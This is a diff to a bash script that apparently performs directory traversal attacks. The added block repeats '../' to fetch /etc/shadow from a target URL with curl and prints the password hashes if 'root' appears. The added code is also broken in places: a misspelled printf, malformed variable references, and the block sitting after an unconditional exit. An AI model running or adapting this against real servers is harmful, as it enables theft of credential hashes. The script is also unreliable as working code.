@@ -80,8 +80,19 @@ echo "Always some interesting stones on the road"
 echo
 echo -e "${GREEN}$print2${RESET}"
 exit 0
+
+echo "Trying to find hashed creds (basically searching for etc/shadows)"
+query3=$(prinf '../%.0s' $(seq 1 $i))"etc/shadow"
+url4="{url}{query4}"
+file3=$(curl -s "$url4")
+if echo "$file3" | grep -q -i "root" ; then 
+print3=$(curl -s "url4")
+echo -e "$(GREEN)$print3${RESET}"
+exit 0 
+
 else
 echo -e "${RED}Gotta dive deeper, my friend${RESET}"
+fi
 fi
 fi
 done
